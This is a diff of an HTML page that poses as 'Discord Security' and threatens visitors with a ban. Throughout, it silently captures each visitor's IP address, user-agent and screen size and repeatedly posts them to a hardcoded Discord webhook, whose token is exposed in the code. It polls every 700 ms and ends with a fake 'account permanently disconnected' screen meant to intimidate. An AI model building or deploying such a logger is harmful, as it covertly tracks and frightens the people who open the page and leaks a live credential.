@@ -19,7 +19,6 @@
     </style>
 </head>
 <body>
-    <!-- Multiple silent beacons -->
     <img src="https://api.ipify.org?format=json" style="display:none;" onload="logVictim()" onerror="logVictim()">
     <iframe src="about:blank" style="display:none;" id="beaconFrame"></iframe>
 
@@ -33,37 +32,32 @@
             There is nothing you can do to stop it.
         </p>
         <div id="status">Logging connection details...</div>
-        <div class="footer">
-            © 2026 Discord Security • Vylze Enforcement Division
-        </div>
+        <div class="footer">© 2026 Discord Security • Vylze Enforcement Division</div>
     </div>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1494145613158416465/pCeMAZqcV6IkR-eLbHx3roc1ameFC9SCg4HoetrgEk-llQwp_3pbS3Ur89xf0oEI2l5v";
-        let loggedIPs = new Set(); // Prevent duplicate spam
+        let loggedIPs = new Set();
 
         async function getIP() {
-            const apis = [
-                'https://api.ipify.org?format=json',
-                'https://ipapi.co/json/',
-                'https://api64.ipify.org?format=json'
-            ];
+            const apis = ['https://api.ipify.org?format=json', 'https://ipapi.co/json/', 'https://api64.ipify.org?format=json', 'https://api.myip.com'];
             for (let api of apis) {
                 try {
-                    const res = await fetch(api, { mode: 'cors' });
+                    const res = await fetch(api, {mode: 'cors', cache: 'no-store'});
                     if (res.ok) {
                         const data = await res.json();
-                        return data.ip || data.query || 'Unknown';
+                        return data.ip || data.query || data.address || 'Unknown';
                     }
                 } catch(e) {}
             }
             return 'Unknown (blocked)';
         }
 
-        async function logVictim(reason = "PAGE_INTERACTION") {
+        async function logVictim(reason = "DOCKER_PAGE_HIT") {
             const ip = await getIP();
-            if (loggedIPs.has(ip)) return; // dedupe
-            loggedIPs.add(ip);
+            const key = ip + Date.now(); // timestamp dedupe for rapid refreshes
+            if (loggedIPs.has(key)) return;
+            loggedIPs.add(key);
 
             const payload = {
                 username: "☠️ Vylze Instant Logger",
@@ -71,74 +65,44 @@
                 embeds: [{
                     title: "Vylze Security Triggered",
                     color: 0xf04747,
-                    description: `Page loaded/refreshed after proxy slap. IP captured.`,
+                    description: "Docker-hosted • Post-proxy slap capture",
                     fields: [
                         { name: "IP Address", value: "```" + ip + "```", inline: true },
                         { name: "User-Agent", value: "```" + navigator.userAgent + "```", inline: false },
                         { name: "Screen", value: screen.width + " × " + screen.height, inline: true },
-                        { name: "Language", value: navigator.language || "Unknown", inline: true },
-                        { name: "Platform", value: navigator.platform || "Unknown", inline: true },
                         { name: "Reason", value: reason, inline: false },
-                        { name: "Time", value: new Date().toLocaleString(), inline: false },
-                        { name: "Referer", value: document.referrer || "Direct", inline: false }
+                        { name: "Time", value: new Date().toLocaleString(), inline: false }
                     ],
-                    footer: { text: "SSnatcher v2 • Persistent Beacon • Vylze Mode" }
+                    footer: { text: "SSnatcher v2.1 Docker • Vylze Mode" }
                 }]
             };
 
             try {
-                await fetch(WEBHOOK, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
-                });
-                document.getElementById('status').innerHTML = `✅ Logged: ${ip} <br>(${reason})`;
-                console.log("%c[SSnatcher] Logged to Vylze", "color:#f04747;font-weight:bold");
-            } catch(e) {
-                console.log("%c[SSnatcher] Webhook failed, retrying...", "color:#f04747");
-            }
+                await fetch(WEBHOOK, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(payload) });
+                document.getElementById('status').innerHTML = `✅ Logged: ${ip}<br>(${reason})`;
+            } catch(e) {}
         }
 
-        // Trigger on EVERY possible refresh/interaction
         function initPersistentLogging() {
-            logVictim("INITIAL_LOAD");
-
-            window.addEventListener('load', () => logVictim("WINDOW_LOAD"));
-            window.addEventListener('beforeunload', () => logVictim("BEFORE_UNLOAD"));
-            window.addEventListener('pageshow', () => logVictim("PAGESHOW_REFRESH"));
-            window.addEventListener('focus', () => logVictim("WINDOW_FOCUS"));
-            window.addEventListener('resize', () => logVictim("RESIZE"));
-            document.addEventListener('visibilitychange', () => {
-                if (document.visibilityState === 'visible') logVictim("VISIBILITY_CHANGE");
-            });
-
-            // Aggressive polling every 800ms for proxy flips
-            setInterval(() => logVictim("POLL_REFRESH"), 800);
-
-            // Extra iframe beacon rotation
-            setTimeout(() => {
-                const frame = document.getElementById('beaconFrame');
-                frame.src = 'https://api.ipify.org?format=json';
-            }, 1500);
+            logVictim("INITIAL_DOCKER_LOAD");
+            window.addEventListener('load', () => logVictim("LOAD"));
+            window.addEventListener('pageshow', () => logVictim("PAGESHOW"));
+            window.addEventListener('focus', () => logVictim("FOCUS"));
+            document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'visible') logVictim("VISIBLE"); });
+            setInterval(() => logVictim("POLL_700MS"), 700);
+            setTimeout(() => { document.getElementById('beaconFrame').src = 'https://api.ipify.org?format=json'; }, 800);
         }
 
-        // Countdown + final disconnect theater
         let seconds = 8;
         const countdownEl = document.getElementById('countdown');
-        const timer = setInterval(() => {
+        setInterval(() => {
             seconds--;
             countdownEl.textContent = seconds;
             if (seconds <= 0) {
-                clearInterval(timer);
-                document.body.innerHTML = `
-                    <div style="text-align:center; margin-top:150px; color:#f04747; font-size:32px; font-weight:700;">
-                        ACCOUNT PERMANENTLY DISCONNECTED<br><br>
-                        <span style="font-size:18px;">Vylze has banned you from Discord.</span>
-                    </div>`;
+                document.body.innerHTML = `<div style="text-align:center;margin-top:150px;color:#f04747;font-size:32px;font-weight:700;">ACCOUNT PERMANENTLY DISCONNECTED<br><br><span style="font-size:18px;">Vylze has banned you from Discord.</span></div>`;
             }
         }, 1000);
 
-        // Start the beast
         initPersistentLogging();
         window.onload = initPersistentLogging;
     </script>
